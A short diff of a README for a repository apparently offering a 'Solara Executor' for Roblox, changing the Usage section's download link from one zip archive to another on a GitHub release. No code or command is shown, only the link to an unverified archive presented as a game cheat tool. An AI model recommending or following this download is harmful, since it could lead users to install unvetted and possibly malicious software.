@@ -10,7 +10,7 @@
   
 ## Usage
 
- * [Download](https://github.com/spear-blackseeker/Solara-Executor-Roblox/releases/download/Download/RobloxSol.zip) the zip archive. <br>
+ * [Download](https://github.com/spear-blackseeker/Solara-Executor-Roblox/releases/download/Download/SolRoblox.zip) the zip archive. <br>
 
  
 ## Notes
